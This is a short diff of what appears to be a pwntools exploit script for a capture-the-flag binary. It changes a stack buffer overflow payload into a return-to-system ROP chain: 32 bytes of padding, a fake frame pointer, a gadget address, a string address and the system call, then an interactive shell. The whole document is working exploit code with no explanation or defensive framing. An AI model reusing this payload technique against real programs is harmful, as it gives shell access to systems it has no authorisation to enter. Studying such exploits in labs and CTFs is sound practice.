@@ -18,8 +18,9 @@ system_addr = elf.symbols["system"]
 print(hex(system_addr))
 
 #pause()
-payload = "a" * 32 + p64(0xdeadbeef) + p64(0x401040) 
-payload += p64(0x402004)
+p.recvuntil("Please Input your name.\n") 
+payload = "a" * 32 + p64(0xdeadbeef) + p64(0x40122b)+ p64(0x402004) 
+payload +=  p64(0x401040)
 p.sendline(payload)
 
 p.interactive()
